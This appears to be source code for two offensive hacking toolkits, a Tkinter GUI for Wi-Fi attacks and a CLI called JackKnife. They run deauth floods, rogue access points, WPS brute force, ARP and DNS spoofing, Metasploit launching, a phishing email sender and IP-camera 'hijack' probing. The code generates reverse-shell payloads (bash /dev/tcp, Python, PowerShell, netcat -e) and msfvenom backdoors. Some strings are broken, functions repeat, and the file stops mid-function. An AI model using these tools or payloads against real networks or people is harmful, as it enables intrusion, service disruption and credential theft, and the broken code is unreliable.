    for box in (scan_out,att_out,crack_out,hashid_out,utils_out): box.delete("1.0",END)
    for v in (target_var,pcap_var,word_var,hash_input,iface_var,nmap_target,nmap_custom,input_var): v.set("")
    refresh_iface_menu(); log(scan_out,"[*] Toolkit reset")
    if exit_after: root.quit()

# ───────────── GUI layout ─────────────────────────────────────────────────
style=ttk.Style(); style.theme_use("alt")
style.configure("TNotebook.Tab",background="#1a1a1a",foreground=NEON,padding=8,font=FONT)
style.configure("Nc.TLabelframe",background=BGC,foreground=NEON,bordercolor=NEON)
style.configure("Nc.TLabelframe.Label",background=BGC,foreground=NEON,font=FONT)

nb=ttk.Notebook(root); nb.pack(fill=BOTH,expand=True)
tabs={}
for k,lbl in [("scan","⚡ Scan"),("attack","⚔️ Attacks"),
              ("crack","💥 Crack"),("hash","🔎 Hash ID"),
              ("clean","🧹 Cleaner"),("utils","🛠 Utilities")]:
    fr=Frame(nb,bg=BGC); nb.add(fr,text=lbl); tabs[k]=fr

# ── Scan tab ---------------------------------------------------------------
ts=tabs["scan"]
row=Frame(ts,bg=BGC); row.pack(fill=X,pady=4)
iface_menu=OptionMenu(row,iface_var,*iw_interfaces()); iface_menu.grid(row=0,column=0,padx=4)
refresh_iface_menu()
Button(row,text="EnableMon",bg=ACCENT,fg="white",command=lambda:set_monitor(iface_var.get(),True)).grid(row=0,column=1,padx=2)
Button(row,text="DisableMon",bg="#ff0030",fg="white",command=lambda:set_monitor(iface_var.get(),False)).grid(row=0,column=2,padx=2)
Label(row,text="Dwell s",bg=BGC,fg=NEON).grid(row=0,column=3,sticky="e")
Spinbox(row,from_=15,to=180,textvariable=scan_time,width=6).grid(row=0,column=4,sticky="w",padx=(0,6))
Button(row,text="Focused",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,daemon=True).start()).grid(row=0,column=5,padx=2)
Button(row,text="Hop",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,kwargs={'channel_hop':True},daemon=True).start()).grid(row=0,column=6,padx=2)
Button(row,text="Stop Scan",bg="#ff0030",fg="white",command=stop_scan).grid(row=0,column=7,padx=6)
Frame(ts,height=2,bg=NEON).pack(fill=X,pady=6)
nrow=Frame(ts,bg=BGC); nrow.pack(fill=X,pady=2)
Label(nrow,text="nmap Target",bg=BGC,fg=NEON).grid(row=0,column=0,padx=4)
Entry(nrow,textvariable=nmap_target,width=18).grid(row=0,column=1)
OptionMenu(nrow,nmap_profile,"Quick Ping","Top-100 Ports","Full TCP","OS Detect","Vuln Script","Custom").grid(row=0,column=2,padx=4)
custom_entry=Entry(nrow,textvariable=nmap_custom,width=22,state="disabled"); custom_entry.grid(row=0,column=3,padx=4)
nmap_profile.trace_add("write",lambda *_: custom_entry.config(state="normal" if nmap_profile.get()=="Custom" else "disabled"))
Button(nrow,text="Run nmap",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=start_nmap_scan,daemon=True).start()).grid(row=0,column=4,padx=4)
scan_out=scrolledtext.ScrolledText(ts,width=115,height=20,bg="#0d0d17",fg=NEON,font=("Consolas",10)); scan_out.pack(fill=BOTH,expand=True,pady=6,padx=2)

# ── Attack tab : scrollable canvas ----------------------------------------
ta=tabs["attack"]
attack_canvas=Canvas(ta,bg=BGC,highlightthickness=0)
attack_vsb=ttk.Scrollbar(ta,orient="vertical",command=attack_canvas.yview)
attack_canvas.configure(yscrollcommand=attack_vsb.set)
attack_vsb.pack(side=RIGHT,fill=Y); attack_canvas.pack(side=LEFT,fill=BOTH,expand=True)
scroll_f=Frame(attack_canvas,bg=BGC); attack_canvas.create_window((0,0),window=scroll_f,anchor="nw")
scroll_f.bind("<Configure>",lambda e: attack_canvas.configure(scrollregion=attack_canvas.bbox("all")))
attack_canvas.bind_all("<MouseWheel>",lambda e: attack_canvas.yview_scroll(int(-e.delta/120),"units"))
for ev in ("<Button-4>","<Button-5>"):
    attack_canvas.bind_all(ev,lambda e: attack_canvas.yview_scroll(1 if ev=="<Button-5>" else -1,"units"))

target_menu=OptionMenu(scroll_f,target_var,""); target_menu.pack(fill=X,padx=10,pady=4)
lf_cap=ttk.LabelFrame(scroll_f,text="📡 Captures",style="Nc.TLabelframe");       lf_cap.pack(fill=X,padx=8,pady=4)
lf_rog=ttk.LabelFrame(scroll_f,text="🪪 Rogue AP / Phish",style="Nc.TLabelframe");lf_rog.pack(fill=X,padx=8,pady=4)
lf_dis=ttk.LabelFrame(scroll_f,text="⚔️ Disruption",style="Nc.TLabelframe");     lf_dis.pack(fill=X,padx=8,pady=4)
lf_exp=ttk.LabelFrame(scroll_f,text="🛠 WPA Exploits",style="Nc.TLabelframe");   lf_exp.pack(fill=X,padx=8,pady=4)

def _grid(frame,buttons):
    for idx,(txt,fn) in enumerate(buttons):
        r,c=divmod(idx,2)
        Button(frame,text=txt,command=fn,bg=ACCENT,fg="white",
               font=FONT,height=1,width=BTN_W,pady=1
        ).grid(row=r,column=c,padx=2,pady=1,sticky="w")
    for c in (0,1): frame.columnconfigure(c,weight=0)

_grid(lf_cap,[("PMKID Capture",start_pmkid),
              ("4-Way Handshake",start_handshake),
              ("Mass-PMKID Sweep",start_mass_pmkid)])
_grid(lf_rog,[("KARMA Rogue-AP",start_karma),
              ("Wifiphisher Portal",start_wifiphisher),
              ("EAPHammer Enterprise",start_eaphammer)])
_grid(lf_dis,[("Deauth Flood",start_deauth),
              ("Beacon Spam",start_beacon),
              ("Probe-Resp Flood",start_probe_flood)])
_grid(lf_exp,[("WPS Bruteforce",start_wps),
              ("WPA3 → WPA2 Down",start_wpa3_downgrade),
              ("SAE/OWE Downgrade",start_sycophant),
              ("TKIP Chop-Chop",start_chopchop),
              ("TKIP Michael Reset",start_michael_reset),
              ("Kr00k-Hunter",start_kr00k)])

Button(scroll_f,text="Stop Attack",bg="#ff0030",fg="white",font=FONT,
       height=1,width=BTN_W*2,command=stop_attack
).pack(fill=X,padx=20,pady=6)
att_out=scrolledtext.ScrolledText(scroll_f,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); att_out.pack(fill=X,pady=(0,8),padx=2)
row=Frame(scroll_f,bg=BGC); row.pack(fill=X,padx=10,pady=(0,8))
Entry(row,textvariable=input_var,font=("Consolas",9),
      bg="#181818",fg="white",insertbackground="white"
).pack(side=LEFT,fill=X,expand=True)
Button(row,text="Send",bg=ACCENT,fg="white",font=FONT,width=BTN_W,command=send_to_proc).pack(side=LEFT,padx=6)
row.bind_all("<Return>",send_to_proc)

# ── Crack tab --------------------------------------------------------------
tc=tabs["crack"]
Entry(tc,textvariable=pcap_var,width=85).pack(pady=2)
Button(tc,text="Browse pcap",command=browse_pcap).pack()
Entry(tc,textvariable=word_var,width=85).pack(pady=2)
Button(tc,text="Browse wordlist",command=browse_word).pack()
Button(tc,text="Start Crack",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=crack,daemon=True).start()).pack(pady=4)
crack_out=scrolledtext.ScrolledText(tc,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); crack_out.pack()

# ── Hash tab ---------------------------------------------------------------
th=tabs["hash"]
Entry(th,textvariable=hash_input,width=85).pack(pady=4)
Button(th,text="Identify Hash",bg=ACCENT,fg="white",command=hashid_action).pack()
hashid_out=scrolledtext.ScrolledText(th,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); hashid_out.pack()

# ── Cleaner tab ------------------------------------------------------------
cl=tabs["clean"]
Button(cl,text="Select & Clean pcapng",bg=ACCENT,fg="white",command=clean_capture).pack(pady=4)
cleaner_out=scrolledtext.ScrolledText(cl,width=115,height=20,bg="#0d0d17",fg=NEON,font=("Consolas",10)); cleaner_out.pack()

# ── Utilities tab ----------------------------------------------------------
ut=tabs["utils"]
Checkbutton(ut,text="Sticky Monitor (leave iface in mon mode)",variable=sticky_mon,bg=BGC,fg=NEON,selectcolor=BGC,activebackground=BGC).pack(anchor="w",padx=12,pady=4)
Checkbutton(ut,text="Killer (stop NetworkManager & co.)",variable=killer_enabled,command=toggle_killer,bg=BGC,fg=NEON,selectcolor=BGC,activebackground=BGC).pack(anchor="w",padx=12,pady=2)
Button(ut,text="Refresh Stats",bg=ACCENT,fg="white",command=show_stats).pack(pady=4)
Button(ut,text="Run Dependency Doctor",bg=ACCENT,fg="white",command=dependency_doctor).pack(pady=2)
utils_out=scrolledtext.ScrolledText(ut,width=115,height=12,bg="#0d0d17",fg=NEON,font=("Consolas",10)); utils_out.pack()
bwF=Frame(ut,bg=BGC); bwF.pack(pady=10,fill=X)
Label(bwF,text="Broadband iface:",bg=BGC,fg=NEON).pack(side=LEFT)
Entry(bwF,textvariable=mon_iface_var,width=12).pack(side=LEFT,padx=4)
Button(bwF,text="Start",bg=ACCENT,fg="white",command=start_bw_monitor).pack(side=LEFT,padx=4)
Button(bwF,text="Stop",bg="#ff0030",fg="white",command=stop_bw_monitor).pack(side=LEFT)
fig=Figure(figsize=(5,2.2),dpi=100,facecolor="#0d0d17"); ax=fig.add_subplot(111)
ax.set_title("kbit/s (60 s)",color=NEON,fontsize=9)
ax.tick_params(axis='x',colors="white"); ax.tick_params(axis='y',colors="white")
ln_up,=ax.plot([],[],label="Up",linewidth=1); ln_dn,=ax.plot([],[],label="Down",linewidth=1)
ax.legend(facecolor="#0d0d17",edgecolor="#0d0d17",labelcolor="white")
canvas=FigureCanvasTkAgg(fig,master=ut); canvas.get_tk_widget().pack(fill=X,padx=10)

# ── Reset tab --------------------------------------------------------------
rt=Frame(nb,bg=BGC); nb.add(rt,text="♻️ Reset")
Button(rt,text="Reset Toolkit",width=26,bg=ACCENT,fg="white",command=lambda:reset_toolkit(False)).pack(pady=12)
Button(rt,text="Reset & Exit",width=26,bg="#ff0030",fg="white",command=lambda:reset_toolkit(True)).pack()

# ─────────── main ─────────────────────────────────────────────────────────
if __name__=="__main__":
    if os.geteuid()!=0:
        messagebox.showerror("Need root","Run with sudo."); sys.exit(1)
    root.mainloop()

# ====== jackknife.py ======
#!/usr/bin/env python3
"""
JackKnife CLI Toolkit
Author: Niko DeRuise

USAGE:
  sudo python3 jackknife.py

REQUIREMENTS:
  - nmap, whois, curl, netcat, searchsploit, metasploit-framework
  - tcpdump, ifconfig, macchanger, iptables, hostapd, dnsmasq

DISCLAIMER:
  For educational and authorized use only.
"""


import os
import subprocess
import time

def clear(): os.system("clear")
def pause(): input("\nPress Enter to continue...")

def banner():
    clear()
    print("""\033[92m
        ╔═══════════════════════════════════╗
        ║        🗡 JACKKNIFE TOOLKIT 🗡       ║
        ║   Offensive Cyber Recon + Attack  ║
        ╚═══════════════════════════════════╝
    [0m""")

def recon_menu():
    clear()
    print("Recon Tools")
    print("[1] Nmap Scan")
    print("[2] WHOIS Lookup")
    print("[3] Subdomain Enumeration")
    print("[4] IP Geolocation")
    print("[5] ASN/Host Info")
    print("[6] Full Recon")
    print("[0] Back")
    choice = input("Choose: ")
    if choice == "1": nmap_scan()
    elif choice == "2": whois_lookup()
    elif choice == "3": subdomain_enum()
    elif choice == "4": ip_geolocate()
    elif choice == "5": asn_lookup()
    elif choice == "6": full_recon()
    elif choice == "0": main_menu()
    else: pause(); recon_menu()

def nmap_scan():
    clear()
    target = input("Target IP or Range: ")
    if not target: return
    print(f"[*] Scanning {target}...")
    os.system(f"nmap -sS -Pn -A {target}")
    pause()

def whois_lookup():
    clear()
    target = input("Domain or IP: ")
    if not target: return
    print(f"[*] WHOIS for {target}...")
    os.system(f"whois {target}")
    pause()

def subdomain_enum():
    clear()
    domain = input("Target domain: ")
    if not domain: return
    print(f"[*] Gathering subdomains for {domain}...")
    os.system(f"curl -s https://crt.sh/?q=%25.{domain} | grep {domain} | sort -u")
    pause()

def ip_geolocate():
    clear()
    ip = input("IP Address: ")
    if not ip: return
    print(f"[*] Geolocation for {ip}...")
    os.system(f"curl -s ipinfo.io/{ip}")
    pause()

def asn_lookup():
    clear()
    ip = input("IP Address: ")
    if not ip: return
    print(f"[*] ASN and hosting info for {ip}...")
    os.system(f"whois {ip} | grep -E 'origin|mnt-by|aut-num|descr|country'")
    pause()

def full_recon():
    clear()
    target = input("Domain or IP for full recon: ")
    if not target: return
    print(f"[*] Full Recon on {target}...
")
    os.system(f"nmap -sS -Pn -A {target}")
    print("\n[+] WHOIS Info:")
    os.system(f"whois {target}")
    print("\n[+] Geolocation:")
    os.system(f"curl -s ipinfo.io/{target}")
    print("\n[+] ASN Info:")
    os.system(f"whois {target} | grep -E 'origin|mnt-by|aut-num|descr|country'")
    print("\n[+] Subdomains:")
    os.system(f"curl -s https://crt.sh/?q=%25.{target} | grep {target} | sort -u")
    pause()

def exploit_menu():
    clear()
    print("Exploitation Tools")
    print("[1] CVE Scanner (nmap vuln)")
    print("[2] SearchSploit Lookup")
    print("[3] Launch Exploit (Metasploit)")
    print("[0] Back")
    choice = input("Choose: ")
    if choice == "1": cve_scan()
    elif choice == "2": searchsploit_lookup()
    elif choice == "3": metasploit_launcher()
    elif choice == "0": main_menu()
    else: pause(); exploit_menu()

def cve_scan():
    clear()
    target = input("Target IP or Host: ")
    if not target: return
    print(f"[*] Scanning {target} for known CVEs...")
    os.system(f"nmap --script vuln {target}")
    pause()

def searchsploit_lookup():
    clear()
    query = input("Search ExploitDB for: ")
    if not query: return
    print(f"[*] Searching ExploitDB for '{query}'...
")
    os.system(f"searchsploit {query}")
    pause()

def metasploit_launcher():
    clear()
    print("Prepare a quick Metasploit session.")
    exploit = input("Exploit Module (e.g. exploit/windows/smb/ms17_010_eternalblue): ")
    rhost = input("RHOST (target IP): ")
    lhost = input("LHOST (your IP): ")
    lport = input("LPORT (default 4444): ") or "4444"
    if not all([exploit, rhost, lhost]):
        print("[-] Missing required fields.")
        pause()
        return
    with open("msf_autoload.rc", "w") as f:
        f.write(f"use {exploit}\n")
        f.write(f"set RHOST {rhost}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("exploit\n")
    print("[*] Launching Metasploit...")
    os.system("x-terminal-emulator -e 'msfconsole -r msf_autoload.rc'")
    pause()

def main_menu():
    banner()
    print("Main Menu")
    print("[1] Recon Tools")
    print("[2] Exploitation Tools")
    print("[0] Exit")
    choice = input("Choose: ")
    if choice == "1": recon_menu()
    elif choice == "2": exploit_menu()
    elif choice == "0":
        print("Exiting...")
        exit()
    else:
        pause()
        main_menu()

if __name__ == "__main__":
    main_menu()


# ================================
# MITM + Wireless + Utility Tools
# ================================

def mitm_menu():
    clear()
    print("MITM Tools")
    print("[1] ARP Spoofing")
    print("[2] DNS Spoofing")
    print("[3] Packet Capture (tcpdump)")
    print("[0] Back")
    choice = input("Choose: ")
    if choice == "1": arp_spoof()
    elif choice == "2": dns_spoof()
    elif choice == "3": packet_capture()
    elif choice == "0": main_menu()
    else: pause(); mitm_menu()

def arp_spoof():
    clear()
    target = input("Target IP: ")
    gateway = input("Gateway IP: ")
    iface = input("Interface (e.g. eth0): ")
    print(f"[*] Spoofing ARP between {target} and {gateway}...")
    os.system(f"x-terminal-emulator -e 'arpspoof -i {iface} -t {target} {gateway}' &")
    pause()

def dns_spoof():
    clear()
    domain = input("Domain to spoof: ")
    fake_ip = input("Redirect to IP: ")
    conf = f"address=/{domain}/{fake_ip}"
    os.makedirs("/etc/dnsmasq.d/", exist_ok=True)
    with open("/etc/dnsmasq.d/spoof.conf", "w") as f2:
        f2.write(conf)
    os.system("systemctl restart dnsmasq")
    print(f"[✓] DNS Spoofing {domain} → {fake_ip}")
    pause()

def packet_capture():
    clear()
    iface = input("Interface (e.g. wlan0): ")
    out = input("Save to file (e.g. dump.pcap): ") or "dump.pcap"
    print(f"[*] Capturing packets on {iface}...")
    os.system(f"x-terminal-emulator -e 'tcpdump -i {iface} -w {out}'")
    pause()

def wireless_menu():
    clear()
    print("Wireless Attacks")
    print("[1] Deauth Attack")
    print("[2] Evil Access Point")
    print("[0] Back")
    choice = input("Choose: ")
    if choice == "1": deauth_attack()
    elif choice == "2": evil_ap()
    elif choice == "0": main_menu()
    else: pause(); wireless_menu()

def deauth_attack():
    clear()
    iface = input("Monitor Interface: ")
    ap = input("AP MAC: ")
    target = input("Target MAC: ")
    print(f"[*] Sending deauth from {ap} to {target} via {iface}...")
    os.system(f"x-terminal-emulator -e 'aireplay-ng --deauth 100 -a {ap} -c {target} {iface}'")
    pause()

def evil_ap():
    clear()
    ssid = input("SSID: ")
    iface = input("Wireless Interface: ")
    os.system(f"ip link set {iface} down")
    os.system(f"iw dev {iface} set type monitor")
    os.system(f"ip link set {iface} up")
    with open("hostapd.conf", "w") as f:
        f.write(f"interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
")
    os.system("x-terminal-emulator -e 'hostapd hostapd.conf'")
    pause()

def utility_menu():
    clear()
    print("Utilities")
    print("[1] MAC Changer")
    print("[2] Firewall Rule Adder")
    print("[3] Log Exporter")
    print("[0] Back")
    choice = input("Choose: ")
    if choice == "1": mac_changer()
    elif choice == "2": fw_manager()
    elif choice == "3": log_exporter()
    elif choice == "0": main_menu()
    else: pause(); utility_menu()

def mac_changer():
    clear()
    iface = input("Interface: ")
    new_mac = input("New MAC (leave blank for random): ")
    os.system(f"ifconfig {iface} down")
    cmd = f"macchanger -r {iface}" if not new_mac else f"macchanger -m {new_mac} {iface}"
    os.system(cmd)
    os.system(f"ifconfig {iface} up")
    pause()

def fw_manager():
    clear()
    rule = input("iptables rule (e.g. -A INPUT -p tcp --dport 22 -j ACCEPT): ")
    os.system(f"iptables {rule}")
    print("[+] Rule added.")
    pause()

def log_exporter():
    clear()
    path = input("Log file path: ")
    if not path:
        print("[-] No path given.")
        pause()
        return
    os.system(f"cp /var/log/syslog {path} 2>/dev/null || echo 'Log copy failed'")
    print(f"[+] Exported to {path}")
    pause()

# Update Main Menu with All Categories
def main_menu():
    banner()
    print("Main Menu")
    print("[1] Recon Tools")
    print("[2] Exploitation Tools")
    print("[3] MITM Tools")
    print("[4] Wireless Attacks")
    print("[5] Utility Tools")
    print("[0] Exit")
    choice = input("Choose: ")
    if choice == "1": recon_menu()
    elif choice == "2": exploit_menu()
    elif choice == "3": mitm_menu()
    elif choice == "4": wireless_menu()
    elif choice == "5": utility_menu()
    elif choice == "0":
        print("Exiting...")
        exit()
    else:
        pause()
        main_menu()


# === TOOL: Payload Generator (msfvenom wrapper) ===

def generate_payload():
    print("\n[+] Payload Generator")
    platform = input("Platform (windows/linux/android): ").strip().lower()
    lhost = input("LHOST: ").strip()
    lport = input("LPORT: ").strip()
    output = input("Output filename (e.g., shell.exe): ").strip()

    payloads = {
        "windows": "windows/meterpreter/reverse_tcp",
        "linux": "linux/x86/meterpreter/reverse_tcp",
        "android": "android/meterpreter/reverse_tcp"
    }

    if platform not in payloads:
        print("[!] Unsupported platform.")
        return

    cmd = f"msfvenom -p {payloads[platform]} LHOST={lhost} LPORT={lport} -f exe -o {output}" if platform != "android" else f"msfvenom -p {payloads[platform]} LHOST={lhost} LPORT={lport} -o {output}"
    print(f"[+] Running: {cmd}")
    os.system(cmd)


# === TOOL: Process Injector (Shellcode Injection) ===

def process_injector():
    print("\n[+] Process Shellcode Injector")
    pid = input("Target Process PID: ").strip()
    shellcode_file = input("Shellcode file (raw .bin): ").strip()

    if not os.path.exists(shellcode_file):
        print("[!] Shellcode file not found.")
        return

    try:
        with open(shellcode_file, "rb") as f:
            shellcode = f.read()
        shellcode_hex = ','.join(['0x{:02x}'.format(b) for b in shellcode])

        print("\n[!] This tool requires root/admin privileges and a suitable injector binary.")
        print("[!] Example injector command:")
        print(f"injector --pid {pid} --shellcode {shellcode_file}")
        print("[!] Or use tools like 'pinject' or 'processhollowing' if compiled.")
        print(f"[>] Shellcode bytes: {len(shellcode)} bytes")
    except Exception as e:
        print(f"[!] Error: {e}")


# === TOOL: Port Knocking Utility ===

import socket
import time

def port_knocking():
    print("\n[+] Port Knocking")
    mode = input("Mode (listen/send): ").strip().lower()

    if mode == "send":
        target_ip = input("Target IP: ").strip()
        ports = input("Knock sequence (comma-separated ports): ").strip().split(",")
        delay = float(input("Delay between knocks (seconds): ") or 0.5)

        print(f"[+] Sending knock sequence to {target_ip}: {ports}")
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, int(port)))
                s.close()
                print(f"[*] Knocked on port {port}")
                time.sleep(delay)
            except Exception as e:
                print(f"[!] Port {port} failed: {e}")
        print("[✓] Knock sequence complete.")

    elif mode == "listen":
        knock_sequence = input("Expected knock sequence (comma-separated ports): ").strip().split(",")
        knock_sequence = list(map(int, knock_sequence))
        sequence_state = []

        def knock_listener():
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.bind(("", 0))
            print(f"[+] Listening for knock sequence: {knock_sequence}")
            while True:
                pkt = sock.recvfrom(65565)[0]
                port = pkt[22] << 8 | pkt[23]
                sequence_state.append(port)
                if sequence_state[-len(knock_sequence):] == knock_sequence:
                    print("[✓] Knock sequence matched! Trigger action.")
                    sequence_state.clear()

        threading.Thread(target=knock_listener, daemon=True).start()
        input("Press ENTER to stop listening...
")
    else:
        print("[!] Invalid mode.")


# === TOOL: Packet Crafter (Scapy-Based) ===

from scapy.all import IP, TCP, UDP, ICMP, send

def packet_crafter():
    print("\n[+] Packet Crafter (TCP/UDP/ICMP)")
    dst = input("Destination IP: ").strip()
    proto = input("Protocol (tcp/udp/icmp): ").strip().lower()

    if proto == "tcp":
        dport = int(input("Destination Port: "))
        sport = int(input("Source Port (default 12345): ") or 12345)
        flags = input("TCP Flags (e.g., S, A, F): ").strip().upper() or "S"
        pkt = IP(dst=dst)/TCP(sport=sport, dport=dport, flags=flags)
    elif proto == "udp":
        dport = int(input("Destination Port: "))
        sport = int(input("Source Port (default 12345): ") or 12345)
        data = input("Payload (optional): ")
        pkt = IP(dst=dst)/UDP(sport=sport, dport=dport)/data
    elif proto == "icmp":
        pkt = IP(dst=dst)/ICMP()
    else:
        print("[!] Unsupported protocol.")
        return

    print("[*] Sending packet...")
    send(pkt, verbose=1)
    print("[✓] Packet sent.")


# === TOOL: Email Phishing Generator (SMTP) ===

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def email_phisher():
    print("\n[+] Email Phishing Generator")
    smtp_server = input("SMTP Server (e.g. smtp.gmail.com): ").strip()
    smtp_port = int(input("SMTP Port (e.g. 587): ").strip())
    username = input("SMTP Username (your email): ").strip()
    password = input("SMTP Password (or app password): ").strip()
    sender = input("From Email: ").strip()
    recipient = input("To Email: ").strip()
    subject = input("Subject: ").strip()
    body = input("HTML Body (or plain text): ").strip()

    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'html'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(username, password)
        server.sendmail(sender, recipient, msg.as_string())
        server.quit()
        print("[✓] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")


# === TOOL: Subdomain Enumerator ===

import requests

def subdomain_enum():
    print("\n[+] Subdomain Enumerator")
    domain = input("Target domain (e.g., example.com): ").strip()
    wordlist_path = input("Path to subdomain wordlist (default: subdomains.txt): ").strip() or "subdomains.txt"
    if not os.path.exists(wordlist_path):
        print("[!] Wordlist not found.")
        return

    try:
        with open(wordlist_path, 'r') as file:
            subdomains = file.read().splitlines()
    except Exception as e:
        print(f"[!] Failed to read wordlist: {e}")
        return

    print(f"[*] Enumerating subdomains for {domain}...")
    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            r = requests.get(url, timeout=2)
            print(f"[✓] Found: {url} (Status: {r.status_code})")
        except requests.RequestException:
            pass


# === TOOL: Hash Cracker (MD5, SHA1, SHA256) ===

import hashlib

def hash_cracker():
    print("\n[+] Hash Cracker")
    hash_input = input("Enter the hash: ").strip().lower()
    algo = input("Algorithm (md5/sha1/sha256): ").strip().lower()
    wordlist_path = input("Path to wordlist: ").strip()

    if not os.path.exists(wordlist_path):
        print("[!] Wordlist file not found.")
        return

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for word in f:
                word = word.strip()
                if algo == 'md5':
                    hashed = hashlib.md5(word.encode()).hexdigest()
                elif algo == 'sha1':
                    hashed = hashlib.sha1(word.encode()).hexdigest()
                elif algo == 'sha256':
                    hashed = hashlib.sha256(word.encode()).hexdigest()
                else:
                    print("[!] Unsupported algorithm.")
                    return
                if hashed == hash_input:
                    print(f"[✓] Match found: {word}")
                    return
        print("[x] No match found.")
    except Exception as e:
        print(f"[!] Error: {e}")


# === TOOL: Camera Hijack Attempt (Public IP Cams) ===

import requests

def camera_hijack():
    print("\n[+] Camera Hijack (Public/Unsecured IP Cams)")
    ip = input("Target IP or URL (e.g., 192.168.1.100 or http://x.x.x.x:8080): ").strip()
    paths = ["/video", "/live", "/stream", "/mjpg/video.mjpg", "/cgi-bin/video.cgi"]

    print(f"[*] Trying common paths on {ip}...")
    for path in paths:
        url = ip + path if ip.startswith("http") else f"http://{ip}{path}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                print(f"[✓] Possible live stream found: {url}")
            else:
                print(f"[-] No stream at {url}")
        except:
            print(f"[x] Failed to connect: {url}")


# === TOOL: Geolocation Tracker (IP Lookup) ===

import requests

def geolocation_tracker():
    print("\n[+] IP Geolocation Tracker")
    ip = input("Enter IP address (or 'me' for your own IP): ").strip()
    if ip.lower() == "me":
        ip = requests.get("https://api.ipify.org").text
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        if data['status'] == 'success':
            print(f"IP: {ip}")
            print(f"Country: {data['country']}")
            print(f"Region: {data['regionName']}")
            print(f"City: {data['city']}")
            print(f"ISP: {data['isp']}")
            print(f"Org: {data['org']}")
            print(f"Lat/Lon: {data['lat']}, {data['lon']}")
        else:
            print(f"[!] Lookup failed: {data.get('message', 'Unknown error')}")
    except Exception as e:
        print(f"[x] Error: {e}")


# === TOOL: Payload Generator (Shell Payloads) ===

def payload_generator():
    print("\n[+] Payload Generator")
    lhost = input("Enter LHOST (your IP): ").strip()
    lport = input("Enter LPORT (your port): ").strip()
    print("\nSelect Payload Type:")
    print(" 1) Bash TCP Reverse Shell")
    print(" 2) Python Reverse Shell")
    print(" 3) PowerShell Reverse Shell")
    print(" 4) Netcat Reverse Shell")
    choice = input("Choice: ").strip()

    if choice == "1":
        cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif choice == "2":
        cmd = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'"
    elif choice == "3":
        cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    elif choice == "4":
        cmd = f"nc -e /bin/bash {lhost} {lport}"
    else:
        print("[!] Invalid choice.")
        return

    print("\n[✓] Generated Payload:")
    print(cmd)


# === TOOL: Network Share Enumerator (SMB/NFS) ===

def share_enumerator():
    print("\n[+] Network Share Enumerator")
    target = input("Enter target IP or hostname: ").strip()
    print("\nSelect protocol to enumerate:")
    print(" 1) SMB Shares")
    print(" 2) NFS Shares")
    choice = input("Choice: ").strip()

    if choice == "1":
        print(f"[✓] Enumerating SMB shares on {target}...")
        os.system(f"smbclient -L \\{target} -N")
    elif choice == "2":
        print(f"[✓] Enumerating NFS shares on {target}...")
        os.system(f"showmount -e {target}")
    else:
        print("[!] Invalid choice.")


# === TOOL: Port Forwarding Manager ===

def port_forwarding_manager():
    print("\n[+] Port Forwarding Manager")
    print("1) Add Port Forward Rule")
    print("2) View Current Rules")
    print("3) Delete Rule")
    choice = input("Select option: ").strip()

    if choice == "1":
        lport = input("Enter local port to forward from: ").strip()
        rhost = input("Enter remote IP to forward to: ").strip()
        rport = input("Enter remote port to forward to: ").strip()
        os.system(f"iptables -t nat -A PREROUTING -p tcp --dport {lport} -j DNAT --to-destination {rhost}:{rport}")
        os.system(f"iptables -A FORWARD -p tcp -d {rhost} --dport {rport} -j ACCEPT")
        print(f"[✓] Forwarding set from local:{lport} → {rhost}:{rport}")
    elif choice == "2":
        print("[✓] Current NAT rules:")
        os.system("iptables -t nat -L --line-numbers")
    elif choice == "3":
        os.system("iptables -t nat -L --line-numbers")
        line = input("Enter line number of rule to delete (NAT table): ").strip()
        os.system(f"iptables -t nat -D PREROUTING {line}")
        print(f"[x] Deleted rule {line} from PREROUTING.")
    else:
        print("[!] Invalid option.")


# === TOOL: Reverse Shell Generator + Listener ===

def reverse_shell_tool():
    print("\n[+] Reverse Shell Generator & Listener")
    print("1) Generate Payload")
    print("2) Start Listener")
    choice = input("Select option: ").strip()

    if choice == "1":
        ip = input("Enter LHOST IP: ").strip()
        port = input("Enter LPORT: ").strip()
        print("\n[✓] Reverse Shell Payloads:")
        print(f"Bash   : bash -i >& /dev/tcp/{ip}/{port} 0>&1")
